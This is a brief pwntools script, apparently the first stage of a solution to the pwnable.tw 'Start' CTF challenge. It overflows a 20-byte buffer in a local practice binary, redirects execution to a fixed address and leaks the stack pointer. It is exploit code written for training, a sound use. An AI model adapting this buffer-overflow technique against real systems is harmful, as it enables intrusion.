from pwn import *
context.arch = "i386"
p = process("./samples/PwnableTW/Start/start")
p.recv(20)
p.send(b"A" * 20 + p32(0x08048087))
leak = p.recv(20)
esp = u32(leak[:4])
log.info(f"ESP: {hex(esp)}")